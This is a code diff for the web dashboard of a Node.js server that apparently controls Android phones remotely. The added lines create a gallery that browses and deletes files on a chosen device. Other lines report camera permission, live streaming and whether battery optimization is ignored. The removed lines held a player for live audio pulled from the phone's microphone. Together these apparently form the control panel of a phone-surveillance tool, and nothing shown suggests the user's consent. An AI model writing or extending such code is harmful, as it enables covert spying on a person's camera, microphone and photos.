+        const deviceId = document.getElementById('galleryDeviceName').textContent.replace('📱 ', '');
+        const device = currentDevices.find(d => d.name === deviceId || d.id === deviceId);
+        const realDeviceId = device ? device.id : deviceId;
+
+        fetch('/api/gallery/file/' + realDeviceId + '/' + encodeURIComponent(file.name), {
+            method: 'DELETE'
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.success) {
+                alert('File deleted');
+                closeImageViewer();
+                // Refresh gallery
+                const deviceId2 = document.getElementById('galleryDeviceName').textContent.replace('📱 ', '');
+                const device2 = currentDevices.find(d => d.name === deviceId2 || d.id === deviceId2);
+                if (device2) openGallery(device2.id);
+            }
+        })
+        .catch(() => alert('Delete failed'));
+    }
+
+    function closeGallery() {
+        document.getElementById('galleryModal').classList.remove('active');
+        closeImageViewer();
+    }
+
+    // Close gallery with Escape key
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            if (document.getElementById('imageViewer').classList.contains('active')) {
+                closeImageViewer();
+            } else if (document.getElementById('galleryModal').classList.contains('active')) {
+                closeGallery();
+            }
+        }
+        if (e.key === 'ArrowLeft') prevImage();
+        if (e.key === 'ArrowRight') nextImage();
+    });
 
     document.getElementById('startBtn').onclick = () => {
         if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
@@ -1155,10 +1515,11 @@ app.get('/', requireAuth, (req, res) => {
             '<div class="status-item"><span class="status-label">Connection</span><span class="' + (device.isConnected ? 'status-allowed' : 'status-denied') + '">' + (device.isConnected ? '● Connected' : '● Disconnected') + '</span></div>' +
             '<div class="status-item"><span class="status-label">WebSocket</span><span class="' + (ws ? 'status-allowed' : 'status-pending') + '">' + (ws ? '⚡ Active' : '⏳ HTTP only') + '</span></div>' +
             '<div class="status-item"><span class="status-label">Camera Permission</span><span class="' + (device.cameraPermission ? 'status-allowed' : 'status-denied') + '">' + (device.cameraPermission ? 'Allowed' : 'Denied') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Battery Optimization</span><span class="' + (device.batteryOptimization ? 'status-allowed' : 'status-denied') + '">' + (device.batteryOptimization ? '✅ Ignored (Allowed)' : '❌ Not Ignored (Denied)') + '</span></div>' +
+            '<div class="status-item"><span class="status-label">Battery Optimization</span><span class="' + (device.batteryOptimization ? 'status-allowed' : 'status-denied') + '">' + (device.batteryOptimization ? '✅ Ignored' : '❌ Not Ignored') + '</span></div>' +
             '<div class="status-item"><span class="status-label">Camera Ready</span><span class="' + (device.cameraReady ? 'status-allowed' : 'status-pending') + '">' + (device.cameraReady ? 'Yes' : 'No') + '</span></div>' +
             '<div class="status-item"><span class="status-label">Streaming</span><span class="' + (device.streaming ? 'status-allowed' : 'status-pending') + '">' + (device.streaming ? 'Active' : 'Idle') + '</span></div>' +
             '<div class="status-item"><span class="status-label">Battery</span><div class="flex-row"><span>' + battery + '%</span><div class="battery-bar-small"><div class="battery-fill-small" style="width:' + battery + '%"></div></div></div></div>' +
+            '<div class="status-item"><span class="status-label">Gallery Files</span><span style="color:#ccc">' + (device.galleryCount || 0) + ' files</span></div>' +
             '<div class="status-item"><span class="status-label">Last Heartbeat</span><span style="color:#ccc">' + (device.lastHeartbeat || 'N/A') + '</span></div>';
         document.getElementById('statusModal').style.display = 'flex';
     }
@@ -1186,13 +1547,19 @@ app.get('/', requireAuth, (req, res) => {
             '<span class="device-name" style="flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">📱 ' + d.name + (d.hasWebSocket ? ' <span style="font-size:10px;color:#4CAF50">⚡WS</span>' : '') + '</span>' +
             (d.streaming ? '<span style="font-size:10px;color:#4CAF50;white-space:nowrap;">● LIVE</span>' : '') +
             '</div>' +
-            '<div style="display:flex;align-items:center;gap:8px;">' +
+            '<div style="display:flex;align-items:center;gap:6px;">' +
+            '<button data-gallery="' + d.id + '" style="background:none;border:1px solid #667eea;color:#667eea;font-size:11px;padding:3px 8px;border-radius:8px;cursor:pointer;">📸 Gallery</button>' +
             '<button data-info="' + d.id + '" style="background:none;border:1px solid #444;color:#888;font-size:11px;padding:3px 8px;border-radius:8px;cursor:pointer;">ℹ Info</button>' +
             '<div class="device-status-dot status-connected"></div>' +
             '</div></div>'
         ).join('');
         devicesList.querySelectorAll('.device-item').forEach(el => {
             el.addEventListener('click', (e) => {
+                if (e.target.dataset.gallery) { 
+                    const device = currentDevices.find(d => d.id === e.target.dataset.gallery);
+                    if (device) openGallery(device.id);
+                    return;
+                }
                 if (e.target.dataset.info) { const d = currentDevices.find(x => x.id === e.target.dataset.info); if (d) showDeviceStatus(d); return; }
                 selectDevice(el.dataset.id);
             });
@@ -1226,173 +1593,6 @@ app.get('/', requireAuth, (req, res) => {
 
     fetchDevices();
     setInterval(fetchDevices, 3000);
-
-    // ========== PCM AUDIO PLAYER ==========
-    let voiceActive   = false;
-    let audioCtx      = null;
-    let gainNode      = null;
-    let analyserNode  = null;
-    let nextPlayTime  = 0;          // scheduled playback cursor
-    let totalVoicePackets = 0;
-    let levelAnimId   = null;
-
-    const voiceDot        = document.getElementById('voiceDot');
-    const voiceStatusText = document.getElementById('voiceStatusText');
-    const voicePacketCount= document.getElementById('voicePacketCount');
-    const voiceVolSlider  = document.getElementById('voiceVolume');
-    const voiceVolLabel   = document.getElementById('voiceVolLabel');
-    const voiceLevelBar   = document.getElementById('voiceLevelBar');
-    const voiceCodecInfo  = document.getElementById('voiceCodecInfo');
-    const voiceSrInfo     = document.getElementById('voiceSampleRateInfo');
-    const voiceLatInfo    = document.getElementById('voiceLatencyInfo');
-
-    // Volume slider
-    voiceVolSlider.oninput = () => {
-        const pct = voiceVolSlider.value;
-        voiceVolLabel.textContent = pct + '%';
-        if (gainNode) gainNode.gain.value = pct / 100;
-    };
-
-    function initAudio() {
-        if (audioCtx) { if (audioCtx.state === 'suspended') audioCtx.resume(); return; }
-        audioCtx     = new (window.AudioContext || window.webkitAudioContext)();
-        gainNode     = audioCtx.createGain();
-        gainNode.gain.value = voiceVolSlider.value / 100;
-        analyserNode = audioCtx.createAnalyser();
-        analyserNode.fftSize = 256;
-        gainNode.connect(analyserNode);
-        analyserNode.connect(audioCtx.destination);
-        nextPlayTime = audioCtx.currentTime;
-        startLevelMeter();
-    }
-
-    function startLevelMeter() {
-        if (levelAnimId) return;
-        const buf = new Uint8Array(analyserNode.frequencyBinCount);
-        function tick() {
-            levelAnimId = requestAnimationFrame(tick);
-            analyserNode.getByteTimeDomainData(buf);
-            let peak = 0;
-            for (let i = 0; i < buf.length; i++) {
-                const v = Math.abs(buf[i] - 128) / 128;
-                if (v > peak) peak = v;
-            }
-            voiceLevelBar.style.width = Math.min(peak * 200, 100) + '%';
-            voiceLevelBar.style.background = peak > 0.6
-                ? 'linear-gradient(90deg,#f44336,#FF5722)'
-                : 'linear-gradient(90deg,#4CAF50,#8BC34A)';
-        }
-        tick();
-    }
-
-    function setVoiceUI(active) {
-        voiceActive = active;
-        voiceDot.classList.toggle('active', active);
-        voiceStatusText.textContent = active ? 'Streaming...' : 'Idle';
-        voiceStatusText.style.color  = active ? '#4CAF50' : '#888';
-        if (!active) {
-            totalVoicePackets = 0;
-            voicePacketCount.textContent = '';
-            voiceLevelBar.style.width = '0%';
-            nextPlayTime = 0;
-        }
-    }
-
-    // START LISTEN — init AudioContext on user gesture (browser requires it)
-    document.getElementById('voiceStartBtn').onclick = () => {
-        initAudio();
-        setVoiceUI(true);
-        // Send command to Android to start sending audio
-        if (selectedDeviceId) {
-            fetch('/api/voice/start', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ deviceId: selectedDeviceId })
-            }).catch(() => {});
-        }
-        console.log('🎙️ PCM player started');
-    };
-
-    document.getElementById('voiceStopBtn').onclick = () => {
-        setVoiceUI(false);
-        if (selectedDeviceId) {
-            fetch('/api/voice/stop', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ deviceId: selectedDeviceId })
-            }).catch(() => {});
-        }
-        console.log('⏹ PCM player stopped');
-    };
-
-    // ===== WebSocket PCM listener =====
-    socket.on('voice_data', (data) => {
-        if (!data.audio || !voiceActive) return;
-
-        // Device filter: accept matching device OR any device if none selected
-        const idMatch  = !selectedDeviceId || data.deviceId === selectedDeviceId;
-        if (!idMatch) return;
-
-        // AudioContext must be init'd (user clicked START LISTEN)
-        if (!audioCtx || audioCtx.state === 'closed') return;
-        if (audioCtx.state === 'suspended') audioCtx.resume();
-
-        const sampleRate = data.sampleRate || 8000;
-        const channels   = data.channels   || 1;
-        const codec      = (data.codec || 'pcm').toLowerCase();
-        const chunks     = Array.isArray(data.audio) ? data.audio : [data.audio];
-        const recvTs     = Date.now();
-
-        // Update info bar
-        voiceCodecInfo.textContent = 'PCM 16-bit LE';
-        voiceSrInfo.textContent    = sampleRate + ' Hz';
-
-        // Ensure playback cursor is not in the past
-        const now = audioCtx.currentTime;
-        if (nextPlayTime < now) nextPlayTime = now + 0.05; // small buffer
-
-        chunks.forEach(chunk => {
-            try {
-                // base64 → Uint8Array
-                const raw   = atob(chunk);
-                const bytes = new Uint8Array(raw.length);
-                for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
-
-                // Decode PCM 16-bit little-endian → float32
-                const samples  = Math.floor(bytes.length / 2);
-                if (samples === 0) return;
-
-                const buffer   = audioCtx.createBuffer(channels, samples, sampleRate);
-                const view     = new DataView(bytes.buffer);
-                for (let ch = 0; ch < channels; ch++) {
-                    const chanData = buffer.getChannelData(ch);
-                    for (let i = 0; i < samples; i++) {
-                        // For mono: both channels read same offset; for stereo: interleaved
-                        const idx = channels === 1 ? i : (i * channels + ch);
-                        const byteIdx = idx * 2;
-                        chanData[i] = byteIdx + 1 < bytes.length
-                            ? view.getInt16(byteIdx, true) / 32768.0
-                            : 0;
-                    }
-                }
-
-                // Scheduled play — seamless, no gaps
-                const src = audioCtx.createBufferSource();
-                src.buffer = buffer;
-                src.connect(gainNode);
-                src.start(nextPlayTime);
-                nextPlayTime += buffer.duration;
-
-                totalVoicePackets++;
-                voicePacketCount.textContent = totalVoicePackets + ' pkts';
-
-                // Latency estimate
-                const latMs = Math.round((audioCtx.currentTime - now) * 1000 + (nextPlayTime - audioCtx.currentTime) * 1000);
-                voiceLatInfo.textContent = 'buf ' + Math.round((nextPlayTime - audioCtx.currentTime) * 1000) + 'ms';
-
-            } catch(e) { console.warn('PCM decode error:', e.message); }
-        });
-    });
 </script>
 </body>
 </html>`);
@@ -1410,6 +1610,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log('📦  Batch Upload : POST /api/batch');
     console.log('⚡  WebSocket    : Stream Only');
     console.log('📡  Commands     : HTTP Polling + WS');
+    console.log('📸  Gallery      : ✅ ENABLED');
     console.log('═══════════════════════════════════════════════════');
     console.log('');
 });
